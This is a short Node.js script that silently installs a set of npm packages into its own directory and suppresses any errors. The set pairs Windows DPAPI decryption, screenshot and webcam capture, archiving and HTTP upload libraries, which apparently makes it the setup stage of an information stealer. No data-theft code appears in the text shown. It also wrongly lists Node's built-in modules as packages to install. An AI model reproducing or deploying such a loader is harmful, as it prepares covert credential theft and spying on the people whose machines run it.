const { execSync } = require('child_process');
const path = require('path');

const installPath = __dirname;
const packages = [
    'fs',
    'fs/promises',
    'path',
    'os',
    'crypto',
    'axios',
    '@primno/dpapi',
    'child_process',
    'screenshot-desktop',
    'form-data',
    'archiver',
    'https',
    'node-webcam'
];

function installPackages() {
    try {
        execSync(`npm install ${packages.join(' ')} --prefix "${installPath}"`, { stdio: 'inherit' });
    } catch (err) {
    }
}

installPackages();
